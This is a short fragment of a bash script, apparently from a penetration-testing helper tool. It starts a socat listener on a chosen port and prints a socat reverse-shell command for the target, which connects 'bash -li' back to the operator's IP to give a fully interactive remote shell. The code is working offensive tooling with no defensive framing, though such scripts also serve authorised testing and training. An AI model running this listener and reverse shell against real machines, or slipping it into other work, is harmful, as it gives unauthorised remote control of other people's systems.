## socat [port]^: socat based listener
# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
if [ "$1" == "socat" ]; then
  CMD="$1"; checkCmd
  if [ "$#" -eq 2 ]; then
    if [[ "$2" =~ ^[0-9]+$ ]]; then # is it a number?
      PORT="$2"
    else
      echo "${warn} Port is not a number!"; exit
    fi
  else
    PORT="9001"
  fi
  CMD="$CMD file:$(tty),raw,echo=0 tcp-listen:$PORT"
  # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
  echo "> Run this on your target:"
  echo -e "   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT\n"
  echo "${bldwht}> $CMD${txtrst}"
  bash -c "$CMD"
  exit
fi
